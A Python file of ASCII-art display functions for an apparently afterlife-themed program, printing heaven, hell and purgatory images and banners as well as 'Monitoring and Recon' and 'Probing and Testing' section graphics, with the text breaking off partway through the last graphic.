#####Graphics for program######

######## ----------------------------------WELCOME GRAPHIC --------------------------------------------- ########

def ascii_Afterlife():
    print('''
@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%########***+++==--:::.......::::--==+++***#####%%%%%%%%@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%######***+++==--::..........::::--==++****####%%%%%%%%@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%###*##***++===--::............:::--==++*****####%%%%%%%@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%######***+++=---::..............:::--==++****####%%%%%%%@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%#####***+++=---::...............:::---==+++***####%%%%%%%@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%#####***+++=--:::.......... .....::::--==+++***#####%%%%%%%@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%#####***++==--::..................:::---==+++***#####%%%%%%%%@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%%%%%%%#%%#####***++==--::...................:::--===++***######%%%%%%%%@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%%%%%%%%#####***+++==--::.......*++..........:::-===++***######%%%%%%%%%%@@@@@@@
@@@@@@@@@@@@@@@@@@@%%%%%%####*****+++==--:::......+**++=... .....::--==+++**#####%%%%%%%%%%%%%@@@@@@
@@@@@@@@@@@@@@@@@@%%%%%%####*****+++==--:::.......+**++=-:. .....::--==++***####%%%%%%%%%%%%%%%@@@@@
@@@@@@@@@@@@@@%%%%%%%%#####*****+++==--::........-***+==-........::--==+***#####%%%%%%%%%%%%%%%%@@@@
@@@@@@@@@@@@@%%%%%%%%%%###*#****++==--:::..#=*=-#*##***:+++=....:.:-==++***######%%%%%%%%%%%@@@@@@@@
@@@@@@@@@@@%%%%%%%%%%%%##*##***++==--:::.*##****####*****#***:.:::--==+***#####%%%%%%%%%%%@@@@@@@@@@
@@@@%@@@@@%%%%%%%%%%%#%####***+++==---:###*############*######*=::-==++**####%%%%%%%%%%%%@@@@@@@@@@@
@@@@%%%@@%%%%%#%%%%%%%####****++===--######%%%%%%###############=:-=++***####%%%%%%%%%%@@@@@@@@@@@@@
@@@@@%%%%%%%%%%%%%%%%%#####***++===##%%%%%%%%%%%%%%%%%####=%%#%%%%#=+***#####%%%%%%%%%%@@@@@@@@@@@@@
@@@@@%%%%%%%%%%%%%%%######****+*%%%%%%%%%%%%%%%%%%%%%%%%*:...#%%%%%%#+**####%%%%%%%%%%%@@@@@@@@@@@@@
@@@%%%%%%%%%%%%%%%%%######*==%%%%%%%%%%%%%@@@@@@@%%%%%%%-::...:%%%%%%%%%####%%%%%%%%%%@@@@@@@@@@@@@@
@@@@@%%@%%%%%%%%%%%######%@@%@@%%%==%%%%%@@@@@@@@@@@@%%%--::::---=%%%%%%%%@#%%%%%%%%%%@@@@@@@@@@@@@@
@@@@@@@@@%%%%%%%#%@@@@@@@@@@@%*++++@%%%%@@@@@@@@@@@@@%%%=-::----==++*%%%%@@@##%%%%%%%%@@@@@@@@@@@@@@
@@@@@@@@@%%%%%%%%#%@@@@@###***+***@%@@@@@@@@@@@@@@@@@@%%+=---=-==++**###%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@%%%%%%%%%@@@#####**=**#*@@@@@@@@@@@@@@@@@@@@@*+=-=====++**###%%%%%%%@@@@@@%@@@@@@@@@@@@@@@
@@@@@@@@@@%%%%%%%%%@%######*=**####%@@@@@@@@@@@@@@@@@@#**====+--+**####%%%%%%%%%@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@%%%%%%%%%%%#####*=*##%%%%@@@@@@@@@@@@@@@@@@@#*+++++++=***##%%%%%%%%%%@%@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@%%%%%%%%%%%%%%##*#%%%%%%#@@@@@@@@@@@@@@@@@@@##+***+-+**####%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@%@%%%%%%%%##%%##*%%%%%%%%%%@@@@@@@@@@@@@@@@%###*****+=#####%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%%%%#%%%%###%%%%%%%%%%@@@@@@@@@@@@@@@%###*******#####%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%%%%%%%%%#%@@%%%%%%%%#@@@@@@@@@@@@@@@#####*****####%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%%%%%%%%%%%@@%%%%%%%%#@@@@@@@@@@@@@@######**#######%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@
''')





####### ------------------------------------ WELCOME SIGN ----------------------------- #######
def ascii_welcome():
        print('''

   _    _      _                            _____       _____ _          
  | |  | |    | |                          |_   _|     |_   _| |         
  | |  | | ___| | ___ ___  _ __ ___   ___    | | ___     | | | |__   ___ 
  | |/\| |/ _ \ |/ __/ _ \| '_ ` _ \ / _ \   | |/ _ \    | | | '_ \ / _ \            
  \  /\  /  __/ | (_| (_) | | | | | |  __/   | | (_) |   | | | | | |  __/
   \/  \/ \___|_|\___\___/|_| |_| |_|\___|   \_/\___/    \_/ |_| |_|\___|
                ___   __ _            _ _  __                                        
               / _ \ / _| |          | (_)/ _|                                       
              / /_\ \ |_| |_ ___ _ __| |_| |_ ___                                    
              |  _  |  _| __/ _ \ '__| | |  _/ _ \                                   
              | | | | | | ||  __/ |  | | | ||  __/                                   
              \_| |_/_|  \__\___|_|  |_|_|_| \___|                                   
''')

####### ------------------------------------- HELL GRAPHIC --------------------------------- #######
def ascii_devil():
    print('''                                                                                                 
                                          .                                                         
                                         ...............                                            
                                 .....#@@@@@@@@@@@@@@@@@@@+....                                     
                            .....#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*....                                
           ....          ....:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:.....                           
           ..%.          ..#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@%..                            
          ..@@-.       ..#@@@@@@@@@@@@@@@@@@@@@@@@@******##******%@@@@@@...                         
          .-@@@...  ....@@%*@@@@@@@@@@@@@@@@@@@@#********@@%********@@@@@#..                        
          .@@#@@.   ..%@@***@@@@@@@@@@@@@@@@@@**********@+*@%#********@@@@@.                        
          .@@*+@@....%@@****@@@@@@@@@@@@@@@@#**********@=#**@**********#@@@@:.                      
          .@@*+-@@@:#@@*****@@@@@@@@@@@@@@@***********@-=*#*@@**********#@@@@.. .                   
          .@@#**--@@@@#*****%@@@@@@@@@@@@#***********@=-****#@***********@@@@@...                   
          .@@@#***----*******@@@@@@@@@@@************@--*****#@***********#@@@@@..                   
          ..@@#*#*****=******@@@@@@@@@@**************-****#*%@***********#@@@@@-                    
          ..*@@**************#@@@@@@@@**************#***#*#*@************%@@@@@@..                  
          ...=@@%******#******@@@@@@@***************#*%%##%@%************@@@@@@@..                  
            ...@@@%#**@*******#@@@@@******************@@@@@*************#@@@@@@@..                  
               ..%@@***********@@@@*************************************@@@@@@@@:.        ....@=.   
  ......       ..%@%******+****#@@#***********************************#@@@@@@@@@..   .....-@@@@+.   
  ..+%-.       ..@@*********-=**@#*******=-**************************@@@@@@@@@@@..   ..#@@@#*@@..   
  ...*@@@:.....+@@*******+#**+-*******--=*%***+*****@@%***********%@@@@@@@@@@@@@...*@@@%*=**#@@.    
     .=@@@@:.%@@@**#@#****-+@*=+*****--*%#*--********@@@@%******@@@@@@@@@@@@@@@@@@@@*+=**@**@@..    
     ..=@#%@@@@%**#@@%*****+=%*=****=-*%*--*********@@@@@@@*******@@@@@@@@@@@@@@*==+**@@%**@@...    
     ...*@@*#@@@**@@@@@*#****=******+***-+******##@@@@@@@@@#******#@@@@@@@@@#+-=**#@@@@***@@....    
       ..%@@**%@***@@@@@@##***%******%*-******#@@@%**#*###@#********@@@@@@*-***%@@@@@##**@%..       
        ..@@##*@@**%##**#@@%*#%**@**@******#@@@@#@%+%@*##*#********#@@@@#=***@@@@@@%***%@*.         
        ...@@##*@@****#@@@@%@@%@*@**@%***@@@@*@@......*@@%#*********@@@@***#@@@@**#***@@...         
          .-@%@@@@%***@.....:@#%@@@%#@@@@##**%@..#@@****+===+*******@@@****@@#@%*****@@....         
          ..@@@@@%#*******%@+-#*@#**###***#**%@#***=-+**************@@@***@#@@%****@@+.....         
          ..:@@@%*=---====+***%#@+-*%***#*@%***********************@@@@****##%***#@@..   ..         
           ..@@@***************%@==*##**#*************************@@@@@#***@****@@#...              
            .%@%*************##@@-+****##@@#**#*************##**@@@%#@@****##*#@@.....              
            .:@@*********#**%@+%@-=***##=--%@@@@@####%@@@@@@@@#*****#*@*****#@@#.                   
            ..=@@%***@@@@@@@@#*%@==*********@*#%%@%%#*#@@@**#@*******#%****#@@...                   
            ....%@@##@#####**%%#@+-*****#@@@%##*#*#%%@@@@@@*#@*********@@@@@=....                   
               ...@@%%*********%@*-****#@**********#@%:@%#@**@*********@@...                        
               ....@@#**#%******@*-***#@*********@@@...@#*%**#*********@@...                        
               .....@@#*##@@%***%*-***@#*****#@@@%..:#.@#*#*#*******##@@%...                        
                 ....@@#*#*#@@@@@#-**@@@@@@@@@@.....-.%@**#*********#@@@.                           
                    ..@@%****@%=@#-*@@@@@#=......%=.*.#@***#*****#%@@@...                           
                    ...@@%***#@+:%*@@..... . ..%.#.#+.@@***#****#@@@..                              
                       .@@@***@@.@@%..       .*.++.+.%@%****@**%@@.. ..                             
                       ..%@@#%#@-.....       .......=@@***%*@#@@%...                                
                         .#@@%*@@...              .=@@%***@%@@@=..                                  
                         ..%@@#%@:..            ..@@@@****@@@@-...                                  
                         ...@@%*@@..          ..+@@@@****@@@@:....                                  
                            .@@*#@@@.........:@@@@@@*****@@@...                                     
                            .*@@**@@@@@@@@@@@@@@@@******@@@..                                       
                            ..@@***@@@@@@@@@@@@%******#@@+...                                       
                            ..=@@**-=*#@@@@@#*=-=****@@@..                                          
                              .%@@*+--*%@@@*+---***@@@-.                                            
                              ..@@@*****@@#*-=***@@@@...                                            
                              ...@@@@%*@@@%***%@@@@-...                                             
                            .....@@@@@@@@@@@@@@@@%...                                               
                            =....@@@@@@@@@@@@@@@..                                                  
                            @%:@@@@@@@@@@@@@@@....                                                  
                            .@@@@@@@@@@@@@@#....                                                    
                            ..-@@@@@@@@@%...                                                        
                                 .....                                                              
''')                                                                                                 

####### ------------------------------- HELL SIGN ------------------------------ #######
def ascii_hell_sign():
    print(colored('''
            _ _ 
  /\  /\___| | |
 / /_/ / _ \ | |
/ __  /  __/ | |
\/ /_/ \___|_|_|
          ''' , 'red'))

###### ----------------------------- HEAVEN GRAPHIC -----------------------------#######
def ascii_icarus():
    print('''
                                                                ..#@@@.                 ..:@@@@@:...          
                                                      #=@%+:@.                +@.........%%..       
                                                     .@@+:%..@..             *#...      ...@..      
                             .. .=@%....              ...@@=:.@-...       . @..   ...... . .@.      
                             .+=.@*.*.@.                  .*@#..@=. .     .@*.  ...@+-*@.. .%+      
                              .@.%...@..                   .+@....@..     .@.   .:...  . @...@%.    
                              ..*@...=@..                  ..@.@...@.    .%..   .@.      ..#..@@..  
                                ..=@ ..:@+                   .@*:.@+@   ..@.  ..*.        .:-..@:   
                                  ..@..  .@#. ...#...@.:...  .@*.@..@.  .@... :. .         .@...@.. 
                                   .=@.@....@@@:@@%..@:@@@-...@..@..@.. .@   .@.            .%:.-#. 
                                   ..%@....=.@.%  ...%.@.-*@@.@. -..@...@......              .%. @+ 
                                      .:@=...#.-#..@@. ..-*=@..... @@ .@+. ..@.               .@:.@.
                                        ..@...@...@@@.  ...-. .....#@..@....@.                ..@..%
                                      ..@@@%@. .......%%@@..*.    ...@=. ..@..                 .*..%
        ...:#@@@@+....                ..@@@....@ ..@= .. .. ..    ...@@. ....                   =+.@
      . .#@+........%@%....          ..%:@@.@...*-...@........ .%:.....@%..                     =..@
      ..@%.          ..-@@:. .       .-%@@@@:..+..#%...@..-@@..... .@@..=.                      =..@
      .@%.            . ...::#@@@%:...+.:@@@.@@. . .@...... . .% .   ...@.                    ..=..@
      @..     ........  ..     ....-@@#@@=..*-@@   .##@...    ..     .  @.                      .@.@
   ..@@.   ....@... ....-@@ ..    .  . ....... .  .-@..@..   ...     :  # .                     .@ @
   .@*....@.....        ...:#@+...    ..  ..-@....:@..@@@%......        .@.   .. .              .@.@
  .@@.. :+                    ..:=.+@@@%@%.@:@@:-+@.%.@..@-:@...        .* ........             .+.@
  .@. ..@.                                    .....-@%.#.. .%+%.        .@.. @.@.@.             .+.@
  #@.  @..                                           .     .%.          .@.@:@@@@@... ..        .+.@
..@:  .+                                                   .*.    ..:.@..@+@@@.@.@+@@..=        .+=@
..@...@.                                                  #-.     .%:..*.@%..... =+@@..@..      .+=@
.@@ .@.                      .....   ..   . . .........#.%..      ..@@.%.@%..    .@. @%@.... .  ..#@
:@..#*..                   ..-..@ ..@.....:...@+.@.-@.@@%..      ..#.  ..:@        ..%@.@.--.... .@@
%*..@.                    ..@@.@@#%@=@@.-@=.%#@@.@@.@%.@..   .....@..  .-.@..        .. @.@@. @...@@
@@.%.                     .@.@@.*.:%.@*..@@=..........@.@....-. @:.    .@ @.          . :@@@*.@..=@@
@@.@.                .  ..@ . . . ..      .          +.%.  .# @+:@.    .+.@.           ..@ .@.@@.@@@
%@.@.              ..@ .@@....                     ..@.+  .@-@ ..@.    .+.@.            ....%.=@:=@@
:@.*.             .@=@.@:                           .@...#.%..  ..@.. ....#.                .@.%@.@@
.@+*.             .@.@%.                           .@ %@..#=.     @.    .@.                ..#..: .#
.#@.-         ..  @...                            .#.....@...     @..   .%.                    ..  .
..@.%.    :   @ .@.                               @.@..%#.... ...@*.   .@.                          
 .@.+.    %  .@..+.                             .@....%....%@*.....  @..@.                          
 .@..     @ .+@.*..                             .@....@.+@...:#+.. ...%@..                          
 .@.. . . @ .@@=.                             ...%@.+=...@-......#@@-....                           
  @.%..@.:@.#...                              .:@@.@ ..:%%@@@@:...                                  
  #%@.:@.@@%..                               .-%..@=..@. .. .                                       
   @:.@@=:@.                               .. @=-#:@.-.                                             
  .@.@.@...                                .%=..@..*.@                                              
  .-......                                .#=..@...@@.                                              
  .                                       @=..@.   ...                                              
                                          +=.@..                                                    
                                          .@+.                                                      
          ''')

####### -------------------------- HEAVEN SIGN ------------------------------------------- ######
def ascii_heaven_sign():
    print(colored('''
  /\  /\___  __ ___   _____ _ __  
 / /_/ / _ \/ _` \ \ / / _ \ '_ \ 
/ __  /  __/ (_| |\ V /  __/ | | |
\/ /_/ \___|\__,_| \_/ \___|_| |_|
          ''' , 'blue'))



######## --------------------------------------------- PURGATORY GRAPHIC --------------------------------------------- ########
def ascii_purgatory():
    print('''
--------------------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::.......................
--------------------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.....................
----------------------::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:.................
-------------------------::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...............
-------------------------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..........
----------------------------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.........
-------------------------------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....
----------------------------------::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..
---------------------------------------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
=-------------------------------------------::::::::::::::::::::::::::::::::::::::::::::::::::::::::
=====--------------------------------------------:::::::::::::::::::::::::::::::::::::::::::::::::::
========---------------------------------------------:::::::::::::::::::::::::::::::::::::::::::::::
==============----------------------------------------------::::::::::::::::::::::::::::::::::::::::
===================--------------------------------------------------------:::::::::::::::::::::::::
========================---------------------------------------------------------------------:::::::
=============================-----------------------------------------------------------------------
===================================-----------=-----------------------------------------------------
++++======================================----@@----------------------------------------------------
++++++++++++++===============================@@@@+=-------------------------------------------------
*************++++++++++++++++++++==========#@@@@%@@-------------------------------------------------
#********************************++++++++==@@@@@@@@%------------------------------------------------
###############################************@@@@@@@@@=====-------------------------------------------
%%%%%#%%%%%%%%%%%%%%%##%##########****#*#***@@@@@@@@+++==============-------------------------------
%%%%%%%%%%%%%%%%%%##%##%######%##############@@@@@@=====++++*+++==-===+++===------------------------
%%%%%%%%%%%%%%%%%%%#####%%##%################@@@@@@===============++==+=+++++=----------------------
%%%%%%%%%%%%%%#%%%%%%%%%%#%#######%###########@@#@@%+====+=============+***#*##*++==----------------
%%%%%%%%%%%@%%%%%%%%%%%%%#%########%%%%%######@@#@@###*+++===============++++==+=+====---====-======
%%%%%%%%%%%%%%%%%%%%%%%%%########%%%#%%%#%#%##@@%@@#########***+=***++++**+*++++=========----------=
@@@@@%%@@%%%%%%%%%%%%%%%#%%%%%%%%%%%%%%%%%%##%#@@@@##%####**+++*+=+==+==+=++++=++=++=====----=------
%@%%@%%%@%@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@%%%##%%##++======+**+++=+++++*####%%+=+=---------
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%##%%###**++=====++====+*=++=++=+++===+==+*=
@@@@@@@@@@%@@%%%%%@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%###*++=========**==+=====#**#*==**+=++
%%%%%%%%%%%%%%%%@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%###+=+===========-=======++===
%%%%%%%%%%%%%@@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%#**+================+*+*+==
%%%%%%%%%%%%@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@%%%%%%%%%%%%%%%%%%%%#%%%%%%###**++=+=============****##*
%%%%%%%%%@@%%%%%@%%%%%%%%%%%%%%%%%%%%%%%@%%%%%%%%%%%%%%%%%%%%%%#%%#%%%#%####**++==========--*##+*+*#
          ''')

####### ----------------------------------------- PURGATORY SIGN ------------------------------------------- #######
def ascii_purgatory_sign():
    print('''
   ___                       _                   
  / _ \_   _ _ __ __ _  __ _| |_ ___  _ __ _   _ 
 / /_)/ | | | '__/ _` |/ _` | __/ _ \| '__| | | |
/ ___/| |_| | | | (_| | (_| | || (_) | |  | |_| |
\/     \__,_|_|  \__, |\__,_|\__\___/|_|   \__, |
                 |___/                     |___/ 
''')


####### ------------------------------------------------- Monitoring and Recon ------------------------------------------#######
def ascii_monitoring_recon_graphic():
    print(colored('''
..............................................::-----::.............................................
...................................:=*-......           ....:+@%=:..................................
...............................:-. .                             .=#*...............................
.........................:+:..                                      ..:*:...........................
......................--                                                 .--........................
...................-%+                                                       @+.....................
.................+@@@=                                                       @@@@+..................
................*@@@*=:                                                       :@@@%:................
..............-@@@@=@@.                                                     .@@@@#+@+...............
.............+@@@*@@%.                                                      %@%@-@@@@%..............
...........-@@@*%@@..:                                                      :.:@@@@%+@%.............
..........=@@@*@@* .@@                                                      .@@@@@=@@@@*............
.........-@@%@@@@:%@%.                                                      @@:.:@@@@@:@+...........
........-@@@@@@#*@@:.                                                       :..%@@@@-%@@@:..........
........@@@@@%*@@-..*.                                                       %@@=:-#@@@@#*..........
.......=@@@@@@@@..=@@                                                       *@+..*@@@@#%@@..........
.......%@@@@@@@*-@@+                                                        +. +@@@@@%@@@@:.........
......:@@@@@@%-@@*. +:                                                      .=@@==@@@@@@=%*.........
......-@@@@@:%@# .-@@=                                                      @@*:@@@@@@#=@@%.........
......#@@@%#@@@-.%@*.*                                                      %.%@@@#@@@@@@@@.........
.....:@@#@@@@@@@@#  :%                                                      @@@@%.:@@@@@@@@-........
.....-@@@@@@+*@%. .%@@                                                     .@@%..%@@@@%-@@@+........
.....-@@@@%=@@@..#@@@@                                                     :@. %@@@@@-@@@@@+........
.....#@@@:@@@@+*@@@-:@:                                                    +* #@@#@@@@@@@@@+........
....:@@%@@@@#=@@@=.#@@+                                                    %@@@%:.@@@@@@@@@+........
....:@@@@@@-@@@=.*@@@@%                                                    @@-:.*@@@@@@@@@@*........
....:@@@@-@@@@==@@@#.%@                                                    @-.+@@@%+@@@@@@@#........
....:@@#@@@@@-@@@%.=@@:                                                    @@@@@@+@@@@@@@@@#........
....:*%@@@@-@@@@:-@@@=                                                      @@@.#@@@@@@@@@@%........
....=@@@@:%@@@@@@@@#.                                                      *:.@@@@@++@@@@@@%........
....*@@=#@@@@=@@@+...                                                      ..  :@@@@@@@@@@@%........
....*@=@@@@*#@@@:%*.                                                              *@@@@@@@@@........
....*@@@@@@@@@@@@.  :@+##=.                                           .:#%#:       *@@@@@@@@:.......
....=@@@@@@@@@@% .=@@@@@@@@@@%=:..                               .-*@@@@@@@@@@@*.++ :@@@@@@@-.......
....=@@@@@@@@@#.*@@@@@@@@@@@@@@@@@@*.                        =@@@@@@@@@@@@@@@@@@@# .%@@@@@@@#.......
....=@@@@@@@@@+@@@@@@@@@@@@@@@@@@@@@@@@@+::*=.  :      .+@@@@@@@@@@@@@@@@@@@@@@@@@@@@*:@@@@@@-......
....#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.  :@*     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.+@@@@@@@@:.....
...-@@@@@+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*:@@#.    -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@*.....
...%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@* ...   .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@% ..@@@@@:....
..-@@@=:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. .%%     .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.-@@*=@@@:...
..*@-:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*@+ +@@.        =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%. .#@@@:..
..*@@@@@@#:@@@@@@@@@@@@@@@@@@@@@@@@@@@@*:++=@@=@@@@.  .%: .-@@@@@@@@@@@@@@@@@@@@@@#:=@@@: .=@@@@@-..
..*@@@@%.@@@%. .%@@@@@@@@@@@@@@-:#@@@@@*.-@@%#@@@@@@. .#. :.. **.:%@@@@@@@@@@@@=. :*.@=..:@@@@@@@-..
..:@@@.*@@@:  #@@-. .@@#.-*.#+@@@=@@@+-:@@@#@@@@@@@@@:  .@@+.. ...       ..:..      .. .@@@@@%=@@:..
...**-@@@@:*@@@+.#@@@@=@@@@@#@@-%@@@@:@@@@=@@@@@@@@@@@-:@*. :@@-                 :%@@.#@@@@@:@@@+...
....=@@@@@@@@@@@@%+@@@@%@@@@@-*@@@@:@@:@@.@@@@@@@@@@@@@=.  %@#.       .:-+= %@%.%@@@@@@@@@:@@@@%....
......:%@@@@@@@%+@@@@@:@@@@*=@@@@=#@++@:*%@@@@@@@@@@@@@@**@%. :@%.  =@-.#@@@@@@@@@@@@@@@+#@@@@#.....
.........-%@@@@@@@@@@@@@@@.@@@@++@+:@.@@@@@@@@@@@@@@@@@@@@. .%@@..-@@@@@@@@@@@@@@@@@@@@%@@@@@=......
.............+@@@@@@@@@@@@@@@*=@@@@=*@@@@@@@@@@@@@@@@@@@@:.*@@: :@@@+:*%@@@@@@@@@@@@@@@@@@+=........
..............*@@@@@@@@@@@@@@@@@@+=@@@@:@@@@@@@@#*@@@@@@-=@@: .%@%.:@@@@@@@@@@@@@@@@@@@*............
..............-@@@@@=@@@@@@@@@@*-@@@@=#@@=@@@@@- :@@@@@@@@-. #@#.-@@@@@@@@@@@+=@@@@@@%:.............
...............#@@-=@@@@-%@@@@+%@@@%*@@#..@@@@:.#@*=@@@@+  +@@. #@@@@@@@@@@@@@@@@@@@@-..............
...............+@@@@@@=+@@@@@@@@@@@@@%..%@@. .*@#...@@+. =@@:..*@@@@@@@@@@@@@@@++@@@#...............
...............:@@@@@#@@@@@@@@@@@@@@:.=@@:  =@%...#@*. -@@-. =@@@+*@@@@@@@@@@%-@@@@@:...............
................*@@@@@@@@@@@@@@@@@@@#@@+. :@@: .*@%. .@@+  :@@+@+#@@@@@@@@@@@@@@@@@+................
................=@@@@@#=@@@@@@@@@@@@@#. .@@:  =@%:..%@*. .@@+ .@@@@@@@@@@@@@@@@@@@%:................
.................*@@@@@@@@@@@@@@@@@%...@@=. :@@:  #@%...@@#..:@@@@*=@@@@:@@@@@.%@@=.................
..................#@@@@@@@@@@@@@@@@@-#@#  .@@-  +@%...#@#  :@@-#@@@@@@+=@@@@-#@@@%..................
..................:%@@@@@@@@@@@@@@-=@@  .@@=  =@@= .*@@ . @@+ %@@@@@%:@@@@@*@@@@%...................
...................:@@@@@@%-@@@@==@@@@@@@*. -@@@-.+@@:..#@#. *@@@@@@@@@@@@@@@@=%:...................
....................=@@@@.@@@@*:@@@@@@@%..@@@@+.-@@-..*@@ ..#@@@@:%@@@@@@@@@=*@+....................
.....................*@:@@@@#:@@@@@@@@:.@@@@*.:@@=  =@@:  +@@+%:#@@@%%@@@@#-@@+.....................
......................%@@@@+%@@@@@@@=.@@@@:..%@+ .-@@= .:@@#..*@@@@.#@@@@%@@@:......................
.......................*@@@@@@@@@@@@@@@@@* *@@+ :@@+ .:@@@. =@@@@%*@@@@@@@@@........................
........................+@@@@@@@@@@@@@@@%@@@@@:%@#  .%@@. :@@@@@@@@@@@@@@@#.........................
.........................:%@@@@@@@@@@@..@@@@:%@%...#@@: .@@@@@@@@@@%@@@@@+..........................
...........................*@@@@@@@@@@@@@@=#@@: .*@@=..@@@.+@@@@@++@@@@@:...........................
............................=@@@@@@@@@@@@@@@-. =@@*..%@@+-@@@@@@@@@@@@@:............................
..............................+@@:*@@@@@@@@:.-@@#.:#@@@%@@@@@@-@@%%@@%..............................
................................+@@@@-@@@@-.@@@.:@@@@@@@@@@@.%@@#@@@=...............................
..................................+@@@@.  %@@@@@@@=%@@@@@-.#@@@@@@#.................................
.....................................=@@@@@@@@@@=.#@@@#..+@@@@@%+...................................
..........................................:---+#####%%@@@@%#=:......................................
''' , 'green'))



def ascii_monitoring_recon_sign():
    print('''
  \  |               _)  |                _)              
 |\/ |   _ \   __ \   |  __|   _ \    __|  |  __ \    _` |
 |   |  (   |  |   |  |  |    (   |  |     |  |   |  (   |
_|  _| \___/  _|  _| _| \__| \___/  _|    _| _|  _| \__, |
                   |        _ \                     |___/ 
  _` |  __ \    _` |       |   |   _ \   __|   _ \   __ \ 
 (   |  |   |  (   |       __ <    __/  (     (   |  |   |
\__,_| _|  _| \__,_|      _| \_\ \___| \___| \___/  _|  _|
          ''')


######### ---------------------------------------------------Probing and Testing ------------------------------------------######
def ascii_probing_graphic():
    print(colored('''
                             .....:=*#**+==+*##***@#%%*=.. . .......                                 
                             .*#-....  .......... ..-=...::-+##*-...                                 
                     ......*+....          ..-..    ...@..... ....:+#.... ..                         
                      ..:%.......          :-*=. ......:%%...   ......:@#:..                         
                  ... .%.              ....#*:.        ..+-..           ..:+%.... .                  
                  ...#: .              ...#=.=         ...%             . ....**.                    
                  ..%.                 ..--:-..          .. .#...          ..*:.-%....               
                  :*.                  ..%.....           . -=...          ...**..:+..               
                .-+..-. .              ....   .......+*.-=-:-=..---.....   ...-+:=-.*.....           
               .==.::....               ...    .=*#+-#:.-:..:.-.:::..-..   . .....#:..+...           
           . ..+:.=*:.                     ...-*:.....        .:#.......       ..:+.+-.#.            
           ...#..=*:.                      ..#........       .:%-.......       ...:.=+..#.           
           ..#..#@*.. ....:.=+:.....:+......:..          ..  +..                  ..*-:=.%...        
           .*+@@+-....-=*=..-:.-+++....+=+.....            ..#...                 ..-:+=..@ ..       
       ...#+......   ....... ..... .. ...-@=..        .....:#=%:....              ....+--..#..       
       .%........    .....#@@@@@@@@@%......%=..       .@@...... +...               ...-=#. -=        
    ...% ..#@@@@@-.. ..:.+.@@@@@@@@@@@%.....@:.. =%=@%...     ...:#@@-.... .          :.%:. #.       
   . . *:..@@@@@@@-...-=...@@@@@@@@@@@@@....#:-. ......      .....:.%*........        :.*=..--...    
       .==.@@@@@@@=........@@@@@@@@@@@@@@. ....              ...+.......%:. ...       .*.%..:+ .     
        .:.@@@@@@@.........%@@@@@@@@@@@@@:....        . . . ....:..   ... -:-....     .+=:# .* ..    
       ...-=@@@@=...:*+....%@@@@@@@@@@@@@@... .       ..... ..:*.           .%*:...   -.#:..:= .     
       ...+.@@@.%=@.%+-.. .-@@@@@@@@@@@@@@.:--.  .... ............ . ...    ........ ..+:...#. ..    
       ...#.%%@.@@@@---... ..#=-#%@@@%*+#..--............ .:=.. ... ....           ....-....#        
       ..=. +...@@@@@*....  ....:..+#@*-..-:-.:..=.:+.=-=:#.: ......:...   .       ...... .=-.       
       .--......@@@@@@*..    ...: . ..::+%+...:.:.:-*=#-#::.:.:.......:++...            ..-+.        
       =:=-.....@@@@@@+.. .......:....:::....::.::..:=%%%+-.:=.*.*-%-+=.....  ..  . .. ..=-...       
       .%+@#..-.@::@-..+@:-=+::.:.......... .......*.=-.-.... .-#-+:....#.-.............=-....       
       ...@@-.#%   .#:+..#+=......::. ......  :.:#.. :..:.. . ..... .#-.@..%..+.%.=.+..+-.           
       .....*.............::.. .**.... ..........::-=+@@@@%%@%%%%%...-.:@-.=%.-*.*....*:..           
           .=...... .....::::..:::*++=.-.:.=@@@@@@@@@@@#...*@@%@@@%@=.... ..=:.::...:@               
